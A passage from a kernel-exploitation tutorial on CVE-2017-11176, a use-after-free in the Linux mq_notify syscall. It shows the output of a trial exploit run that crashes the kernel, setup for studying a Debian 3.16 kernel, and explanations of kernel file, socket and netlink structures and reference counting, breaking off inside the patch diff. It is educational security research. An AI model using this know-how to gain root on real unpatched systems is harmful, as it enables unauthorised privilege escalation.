<span class="o">[</span> <span class="o">]</span> <span class="nv">optmem_max</span> <span class="o">=</span> <span class="m">20480</span>
<span class="o">[</span>+<span class="o">]</span> can use the <span class="s1">'ancillary data buffer'</span> reallocation gadget!
<span class="o">[</span>+<span class="o">]</span> g_uland_wq_elt.func <span class="o">=</span> 0xffffffff8107b6b8
<span class="o">[</span>+<span class="o">]</span> reallocation data initialized!
<span class="o">[</span> <span class="o">]</span> initializing reallocation threads, please wait...
<span class="o">[</span>+<span class="o">]</span> <span class="m">200</span> reallocation threads ready!
<span class="o">[</span>+<span class="o">]</span> reallocation ready!
<span class="o">[</span>+<span class="o">]</span> <span class="m">300</span> candidates created
<span class="o">[</span>+<span class="o">]</span> parsing <span class="s1">'/proc/net/netlink'</span> <span class="nb">complete</span>
<span class="o">[</span>+<span class="o">]</span> adjacent candidates found!
<span class="o">[</span>+<span class="o">]</span> netlink candidates ready:
<span class="o">[</span>+<span class="o">]</span> target.pid <span class="o">=</span> -4590
<span class="o">[</span>+<span class="o">]</span> guard.pid  <span class="o">=</span> -4614
<span class="o">[</span> <span class="o">]</span> preparing blocking netlink socket
<span class="o">[</span>+<span class="o">]</span> receive buffer reduced
<span class="o">[</span> <span class="o">]</span> flooding socket
<span class="o">[</span>+<span class="o">]</span> flood completed
<span class="o">[</span>+<span class="o">]</span> blocking socket ready
<span class="o">[</span>+<span class="o">]</span> netlink fd duplicated <span class="o">(</span><span class="nv">unblock_fd</span><span class="o">=</span><span class="m">403</span>, <span class="nv">sock_fd2</span><span class="o">=</span><span class="m">404</span><span class="o">)</span>
<span class="o">[</span> <span class="o">]</span> creating unblock thread...
<span class="o">[</span>+<span class="o">]</span> unblocking thread has been created!
<span class="o">[</span> <span class="o">]</span> get ready to block
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> closing <span class="m">576</span> fd
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> unblocking now
<span class="o">[</span>+<span class="o">]</span> mq_notify succeed
<span class="o">[</span> <span class="o">]</span> creating unblock thread...
<span class="o">[</span>+<span class="o">]</span> unblocking thread has been created!
<span class="o">[</span> <span class="o">]</span> get ready to block
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> closing <span class="m">404</span> fd
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> unblocking now
<span class="o">[</span> <span class="m">55</span>.395645<span class="o">]</span> Freeing alive netlink socket ffff88001aca5800
<span class="o">[</span>+<span class="o">]</span> mq_notify succeed
<span class="o">[</span>+<span class="o">]</span> guard socket closed
<span class="o">[</span> <span class="m">60</span>.399964<span class="o">]</span> general protection fault: <span class="m">0000</span> <span class="o">[</span><span class="c1">#1] SMP</span>
... cut <span class="o">(</span>other crash dump info<span class="o">)</span> ...

<span class="o">&lt;&lt;&lt;</span> HIT CTRL-C &gt;&gt;&gt;
</code></pre></div><p>The exploit failed (and does not give root shell) because it has not been built for this target. As you will see, it requires modifications (cf. part 3 and 4). However, it validates that we can reach the bug.</p><p><strong>WARNING</strong>: Because of other differences between our target and the suggested one, <strong>you WILL NOT get some kernel crashes</strong> (e.g. part 2). The reason being, the kernel does not automatically crash on certain error (just like above) but simply hang or kill the exploit. However, it is in a unstable state and can crash at any time. It is recommended to read the code and understand those differences.</p><h2 id="getting-kernel-source-code">Getting Kernel Source Code</h2><p>Once the system has been installed and ready, the next step is to grab the kernel source code. Again, since we are using an <em>outdated</em> kernel, we will need to grab it with:</p><div class="highlight"><pre><span></span><code><span class="c1"># wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-source-3.16_3.16.36-1%2Bdeb8u1_all.deb</span>
</code></pre></div><p>And:</p><div class="highlight"><pre><span></span><code><span class="c1"># dpkg -i linux-source-3.16_3.16.36-1+deb8u1_all.deb</span>
</code></pre></div><p>The kernel source code should be located at: <strong>/usr/src/linux-source-3.16.tar.xz</strong>.</p><p>Since the target kernel <strong>will crash a lot</strong>, you must analyse the kernel code and develop the exploit <strong>from your host system</strong>. That is, get those source back to your host system. The target must only be used to compile/run the exploit and SystemTap (through ssh!).</p><p>From here, you can use any code crawling tool. It is <strong>required</strong> that you can cross-reference symbols efficiently. Linux has multiple millions lines of code, you will get lost without it.</p><p>A lot of kernel developers seems to use <strong>cscope</strong>. You can generate the cross-references by doing <a href="http://cscope.sourceforge.net/large_projects.html">like this</a> or just:</p><div class="highlight"><pre><span></span><code>cscope -kqRubv
</code></pre></div><p>Note the <em>-k</em> modifier which excludes your system library headers as the kernel runs in <a href="https://wiki.osdev.org/C_Library#Freestanding_and_Hosted">freestanding</a>. The cscope database generation takes a couple of minutes, then use an editor which has a plugin for it (e.g. vim, emacs).</p><p>Hopefully, you are now ready to develop your first kernel exploit.</p><p>GL&amp;HF! :-)</p><hr><h1 id="core-concepts">Core Concepts</h1><p>In order not to get lost at the very first line of the CVE analysis, it is necessary to introduce some core concepts of the Linux kernel. Please note that most structures exposed here are incomplete in order to keep it simple.</p><h2 id="process-descriptor-task_struct-and-the-current-macro">Process descriptor (task_struct) and the current macro</h2><p>One of the most important structures in the kernel is the <strong>struct task_struct</strong>, yet not the simplest one.</p><p>Every task has a <em>task_struct</em> object living in memory. A userland <em>process</em> is composed of at least one task. In a multi-threaded application, there is one <em>task_struct</em> for every thread. Kernel threads also have their own task_struct (e.g. kworker, migration).</p><p>The task_struct holds crucial information like:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/sched.h]</span>

<span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">state</span><span class="p">;</span><span class="w">            </span><span class="c1">// process state (running, stopped, ...)</span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">stack</span><span class="p">;</span><span class="w">                    </span><span class="c1">// task's stack pointer</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">prio</span><span class="p">;</span><span class="w">                       </span><span class="c1">// process priority</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mm_struct</span><span class="w"> </span><span class="o">*</span><span class="n">mm</span><span class="p">;</span><span class="w">           </span><span class="c1">// memory address space</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">files_struct</span><span class="w"> </span><span class="o">*</span><span class="n">files</span><span class="p">;</span><span class="w">     </span><span class="c1">// open file information</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="p">;</span><span class="w">        </span><span class="c1">// credentials</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Accessing the current running task is such a common operation that a macro exists to get a pointer on it: <strong>current</strong>.</p><h2 id="file-descriptor-file-object-and-file-descriptor-table">File Descriptor, File Object and File Descriptor Table</h2><p>Everybody knows that "<em>everything is a file</em>", but what does it actually <a href="https://yarchive.net/comp/linux/everything_is_file.html">mean</a>?</p><p>In the Linux kernel, there are basically seven kinds of files: regular, directory, link, character device, block device, fifo and socket. Each of them can be represented by a <strong>file descriptor</strong>. A file descriptor is basically an integer that is only meaningful for a given process. For each file descriptor, there is an associated structure: <strong>struct file</strong>.</p><p>A struct <em>file</em> (or file object) represents a file that has been opened. It does not necessarily match any image on the disk. For instance, think about accessing files in a <em>pseudo-file systems</em> like <strong>/proc</strong>. While reading a file, the system may need to keep track of the cursor. This is the kind of information stored in a struct file. Pointers to struct file are often named <em>filp</em> (for file pointer).</p><p>The most important fields of a struct file are:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/fs.h]</span>

<span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">loff_t</span><span class="w">                            </span><span class="n">f_pos</span><span class="p">;</span><span class="w">            </span><span class="c1">// "cursor" while reading file</span>
<span class="w">    </span><span class="n">atomic_long_t</span><span class="w">                     </span><span class="n">f_count</span><span class="p">;</span><span class="w">          </span><span class="c1">// object's reference counter</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file_operations</span><span class="w">      </span><span class="o">*</span><span class="n">f_op</span><span class="p">;</span><span class="w">            </span><span class="c1">// virtual function table (VFT) pointer</span>
<span class="w">  </span><span class="kt">void</span><span class="w">                              </span><span class="o">*</span><span class="n">private_data</span><span class="p">;</span><span class="w">      </span><span class="c1">// used by file "specialization"</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>The mapping which translates a file descriptor into a struct file pointer is called the <strong>file descriptor table (fdt)</strong>. Note that this is not a 1:1 mapping, there could be several file descriptors pointing to the same file object. In that case, the pointed file object has its reference counter increased by one (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#reference-counters">Reference Counters</a>). The FDT is stored in a structure called: <strong>struct fdtable</strong>. This is really just an array of struct file pointers that can be indexed with a file descriptor.</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/fdtable.h]</span>

<span class="k">struct</span> <span class="nc">fdtable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">max_fds</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w">      </span><span class="cm">/* current fd array */</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>What links a file descriptor table to a process is the <strong>struct files_struct</strong>. The reason why the fdtable is not directly embedded into a <em>task_struct</em> is that it has other information (e.g. close on exec bitmask, ...). A struct <em>files_struct</em> can also be shared between several threads (i.e. <em>task_struct</em>) and there is some optimization tricks as well.</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/fdtable.h]</span>

<span class="k">struct</span> <span class="nc">files_struct</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">atomic_t</span><span class="w"> </span><span class="n">count</span><span class="p">;</span><span class="w">           </span><span class="c1">// reference counter</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">fdtable</span><span class="w"> </span><span class="o">*</span><span class="n">fdt</span><span class="p">;</span><span class="w">      </span><span class="c1">// pointer to the file descriptor table</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>A pointer to a <em>files_struct</em> is stored in the <em>task_struct</em> (field <em>files</em>).</p><h2 id="virtual-function-table-vft">Virtual Function Table (VFT)</h2><p>While being mostly implemented in C, Linux remains an <em>object-oriented</em> kernel.</p><p>One way to achieve some <em>genericity</em> is to use a <strong>virtual function table (vft)</strong>. A virtual function table is a structure which is mostly composed of function pointers.</p><p>The mostly known VFT is <strong>struct file_operations</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/fs.h]</span>

<span class="k">struct</span> <span class="nc">file_operations</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">ssize_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">read</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="p">,</span><span class="w"> </span><span class="n">loff_t</span><span class="w"> </span><span class="o">*</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">ssize_t</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">write</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="p">,</span><span class="w"> </span><span class="n">loff_t</span><span class="w"> </span><span class="o">*</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">open</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">inode</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">release</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">inode</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Since <em>everything is a file</em> but not of the same type, they all have different <strong>file operations</strong>, often called <strong>f_ops</strong>. Doing so allows the kernel code to handle file independently of their type and code factorization. It leads to such kind of code:</p><div class="highlight"><pre><span></span><code><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">read</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">count</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span><span class="w"></span>
</code></pre></div><h2 id="socket-sock-and-skb">Socket, Sock and SKB</h2><p>A <strong>struct socket</strong> lives at the top-layer of the network stack. From a file perspective, this is the first level of specialization. During socket creation (<em>socket()</em> syscall), a new struct file is created and its file operation (field <em>f_op</em>) is set to <strong>socket_file_ops</strong>.</p><p>Since every file is represented with a file descriptor, you can use any syscall that takes a file descriptor as argument (e.g. <em>read(), write(), close()</em>) with a socket file descriptor. This is actually the main benefit of "<em>everything is a file</em>" motto. Independently of the socket's type, the kernel will invoke the generic socket file operation:</p><div class="highlight"><pre><span></span><code><span class="c1">// [net/socket.c]</span>

<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file_operations</span><span class="w"> </span><span class="n">socket_file_ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">read</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_aio_read</span><span class="p">,</span><span class="w">      </span><span class="c1">// &lt;---- calls sock-&gt;ops-&gt;recvmsg()</span>
<span class="w">    </span><span class="p">.</span><span class="n">write</span><span class="w"> </span><span class="o">=</span><span class="w">    </span><span class="n">sock_aio_write</span><span class="p">,</span><span class="w"> </span><span class="c1">// &lt;---- calls sock-&gt;ops-&gt;sendmsg()</span>
<span class="w">    </span><span class="p">.</span><span class="n">llseek</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">no_llseek</span><span class="p">,</span><span class="w">      </span><span class="c1">// &lt;---- returns an error</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Since <em>struct socket</em> actually implements the <em>BSD socket API</em> (connect(), bind(), accept(), listen(), ...), they embedded a special <em>virtual function table (vft)</em> of type <strong>struct proto_ops</strong>. Every type of socket (e.g. AF_INET, AF_NETLINK) implements its own <em>proto_ops</em>.</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/net.h]</span>

<span class="k">struct</span> <span class="nc">proto_ops</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="p">(</span><span class="o">*</span><span class="n">bind</span><span class="p">)</span><span class="w">    </span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="n">myaddr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sockaddr_len</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="p">(</span><span class="o">*</span><span class="n">connect</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="n">vaddr</span><span class="p">,</span><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sockaddr_len</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="p">(</span><span class="o">*</span><span class="n">accept</span><span class="p">)</span><span class="w">  </span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">newsock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>When a BSD-style syscall is invoked (e.g. bind()), the kernel generally follows that scheme:</p><ol><li>Retrieves a <em>struct file</em> from the file descriptor table</li><li>Retrieves a <em>struct socket</em> from the <em>struct file</em></li><li>Invokes the specialized <em>proto_ops</em> callbacks (e.g. <em>sock-&gt;ops-&gt;bind()</em>)</li></ol><p>Because some protocol operations (e.g. sending/receiving data) might actually need to go into the lower layer of the network stack, the <em>struct socket</em> has a pointer to a <strong>struct sock</strong> object. This pointer is generally used by the socket protocol operations (<em>proto_ops</em>). In the end, a <em>struct socket</em> is a kind of glue between a <em>struct file</em> and a <em>struct sock</em>.</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/net.h]</span>

<span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">file</span><span class="w">     </span><span class="o">*</span><span class="n">file</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w">     </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">proto_ops</span><span class="w">  </span><span class="o">*</span><span class="n">ops</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>The <em>struct sock</em> is a complex data structure. One might see it as a middle-ish thing between the lower layer (network card driver) and higher level (socket). Its main purpose is the ability to hold the receive/send buffers in a <em>generic</em> way.</p><p>When a packet is received over the network card, the driver "enqueued" the network packet into the sock receive buffer. It will stay there until a program decides to receive it (<em>recvmsg()</em> syscall). The other way around, when a program wants to send data (<em>sendmsg()</em> syscall), a network packet is "enqueued" onto the sock sending buffer. Once notified, the network card will then "dequeue" that packet and send it.</p><p>Those "network packets" are the so-called <strong>struct sk_buff</strong> (or skb). The receive/send buffers are basically a doubly-linked list of skb:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/sock.h]</span>

<span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">         </span><span class="n">sk_rcvbuf</span><span class="p">;</span><span class="w">    </span><span class="c1">// theorical "max" size of the receive buffer</span>
<span class="w">    </span><span class="kt">int</span><span class="w">         </span><span class="n">sk_sndbuf</span><span class="p">;</span><span class="w">    </span><span class="c1">// theorical "max" size of the send buffer</span>
<span class="w">    </span><span class="n">atomic_t</span><span class="w">        </span><span class="n">sk_rmem_alloc</span><span class="p">;</span><span class="w">  </span><span class="c1">// "current" size of the receive buffer</span>
<span class="w">    </span><span class="n">atomic_t</span><span class="w">        </span><span class="n">sk_wmem_alloc</span><span class="p">;</span><span class="w">  </span><span class="c1">// "current" size of the send buffer</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sk_buff_head</span><span class="w"> </span><span class="n">sk_receive_queue</span><span class="p">;</span><span class="w">   </span><span class="c1">// head of doubly-linked list</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sk_buff_head</span><span class="w"> </span><span class="n">sk_write_queue</span><span class="p">;</span><span class="w">     </span><span class="c1">// head of doubly-linked list</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">socket</span><span class="w">       </span><span class="o">*</span><span class="n">sk_socket</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>As we can see, a <em>struct sock</em> references a <em>struct socket</em> (field <em>sk_socket</em>), while a <em>struct socket</em> references a <em>struct sock</em> (field <em>sk</em>). In the very same way, a <em>struct socket</em> references a <em>struct file</em> (field <em>file</em>) while a <em>struct file</em> references a <em>struct socket</em> (field <em>private_data</em>). This "2-way mechanism" allows data to go up-and-down through the network stack.</p><p><strong>NOTE</strong>: Do not get confused! The <em>struct sock</em> objects are often called <em>sk</em>, while <em>struct socket</em> objects are often called <em>sock</em>.</p><h2 id="netlink-socket">Netlink Socket</h2><p>Netlink socket is a type of socket (i.e. family) just like UNIX or INET sockets.</p><p>Netlink socket (AF_NETLINK) allows communication between kernel and user space. It can be used to modify the routing table (NETLINK_ROUTE protocol), to receive SELinux event notifications (NETLINK_SELINUX) and even communicate to other userland process (NETLINK_USERSOCK).</p><p>Since <em>struct sock</em> and <em>struct socket</em> are <em>generic</em> data structure supporting all kinds of sockets, it is necessary to somehow "specialize them" at some point.</p><p>From the socket perspective, the <em>proto_ops</em> field needs to be defined. For the netlink family (AF_NETLINK), the BSD-style socket operations are <strong>netlink_ops</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">proto_ops</span><span class="w"> </span><span class="n">netlink_ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">bind</span><span class="w"> </span><span class="o">=</span><span class="w">     </span><span class="n">netlink_bind</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">accept</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">sock_no_accept</span><span class="p">,</span><span class="w">     </span><span class="c1">// &lt;--- calling accept() on netlink sockets leads to EOPNOTSUPP error</span>
<span class="w">    </span><span class="p">.</span><span class="n">sendmsg</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">netlink_sendmsg</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">recvmsg</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">netlink_recvmsg</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>It gets a little bit more complicated, from the sock perspective. One might see a <em>struct sock</em> as an abstract class. Hence, a sock needs to be specialized. In the netlink case, this is made with <strong>struct netlink_sock</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/net/netlink_sock.h]</span>

<span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="cm">/* struct sock has to be the first member of netlink_sock */</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w">     </span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>In other words, a <em>netlink_sock</em> is a "sock" with some additional attributes (i.e. inheritance).</p><p>The top-level comment is of utter importance. It allows the kernel to manipulate a generic <em>struct sock</em> without knowing its precise type. It also brings another benefit, the <em>&amp;netlink_sock.sk</em> and <em>&amp;netlink_sock</em> addresses <strong>aliases</strong>. Consequently, freeing the pointer <em>&amp;netlink_sock.sk</em> actually frees the whole <em>netlink_sock</em> object. From a language theory perspective, this is how the kernel does <em>type polymorphism</em> whilst the C language does not have any feature for it. The <em>netlink_sock</em> life cycle logic can then be kept in a generic, well tested, code.</p><h2 id="putting-it-all-together">Putting it all together</h2><p>Now that core data structures have been introduced, it is time to put them all in a diagram to visualize their relationships:</p><p></p><figure><img src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/core_struct_relationship.png" title="Core Structure Relationship"><figcaption class="figcaption figure-caption text-center">core struct relationship</figcaption></figure><p></p><p><strong>READING</strong>: Each arrow represents a pointer. No line "crosses" each other. The "sock" structure is <em>embedded</em> inside the "netlink_sock" structure.</p><h2 id="reference-counters">Reference counters</h2><p>In order to conclude this introduction of the kernel core concepts, it is necessary to understand how the Linux kernel handles <strong>reference counters</strong>.</p><p>To reduce memory leaks in the kernel and to prevent <em>use-after-free</em>, most Linux data structures embed a "ref counter". The refcounter itself is represented with an <strong>atomic_t</strong> type which is basically an integer. The refcounter is only manipulated through atomic operations like:</p><ul><li><strong>atomic_inc()</strong></li><li><strong>atomic_add()</strong></li><li><strong>atomic_dec_and_test()</strong> // substract 1 and test if it is equals zero</li></ul><p>Because there is no "smart pointer" (or operator overload stuff), the reference counter handling is done <em>manually</em> by the developers. It means that when an object becomes referenced by another object, its refcounter must be <em>explicitly</em> increased. When this reference is dropped, the refcounter must be <em>explicitly</em> decreased. The object is generally freed when its refcounter reaches zero.</p><p><strong>NOTE</strong>: increasing the refcounter is often called "taking a reference", while decreasing the refcounter is called "dropping/releasing a reference".</p><p>However, if at any time, there is an imbalance (e.g. taking one reference and dropping two), there is a risk of memory corruption:</p><ul><li>refcounter decreased twice: <em>use-after-free</em></li><li>refcounter increased twice: memory leak or <em>int-overflow</em> on the refcounter leading to <em>use-after-free</em></li></ul><p>The Linux Kernel has several facilities to handle refcounters (<em>kref, kobject</em>) with a common interface. However, it is not systematically used and the objects we will manipulate here have their own reference counter helpers. In general, taking a reference is mostly made of <strong>"*_get()"</strong> like functions, while dropping reference are <strong>"*_put()"</strong> like functions.</p><p>In our case, each object has different helpers names:</p><ul><li><strong>struct sock</strong>: sock_hold(), sock_put()</li><li><strong>struct file</strong>: fget(), fput()</li><li><strong>struct files_struct</strong>: get_files_struct(), put_files_struct()</li><li>...</li></ul><p><strong>WARNING</strong>: it can get even more confusing! For instance, <strong>skb_put()</strong> actually does not decrease any refcounter, it "pushes" data into the sk buffer! Do not assume anything about what a function does based on its name, check it.</p><p>Now that every data structure required to understand the bug has been introduced, let's move on and analyze the CVE.</p><hr><h1 id="public-information">Public Information</h1><p>Before digging into the bug, let's describe the main purpose of the <strong>mq_notify()</strong> syscall. As stated by the man, "mq_*" stands for "POSIX message queues" and comes as a replacement for legacy System V message queues:</p><div class="highlight"><pre><span></span><code>POSIX message queues allow processes to exchange data in the form of messages.
This API is distinct from that provided by System V message  queues (msgget(2),
msgsnd(2), msgrcv(2), etc.), but provides similar functionality.
</code></pre></div><p>The <em>mq_notify()</em> syscall itself is used to register/unregister for asynchronous notifications.</p><div class="highlight"><pre><span></span><code>mq_notify() allows the calling process to register or unregister for delivery of an
asynchronous notification when a new message arrives on the empty message queue
referred to by the descriptor mqdes.
</code></pre></div><p>When studying a CVE, it is always good to start with the description and the patch that corrects it.</p><p><em>The</em><em>mq_notify</em><em>function in the Linux kernel through 4.11.9 does not set</em><em>the sock pointer</em><em>to NULL upon entry into the</em><em>retry logic</em><em>. During a user-space close of a</em><em>Netlink socket</em><em>, it allows attackers to cause a denial of service (</em><em>use-after-free</em><em>) or possibly have unspecified other impact (ring-0 take over?).</em></p><p>The patch is available <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f991af3daabaecff34684fd51fac80319d1baad1">here</a>:</p><div class="highlight"><pre><span></span><code><span class="gh">diff --git a/ipc/mqueue.c b/ipc/mqueue.c</span>
<span class="gh">index c9ff943..eb1391b 100644</span>
<span class="gd">--- a/ipc/mqueue.c</span>
<span class="gi">+++ b/ipc/mqueue.c</span>
<span class="gu">@@ -1270,8 +1270,10 @@ retry:</span>

      timeo = MAX_SCHEDULE_TIMEOUT;
      ret = netlink_attachskb(sock, nc, &amp;timeo, NULL);
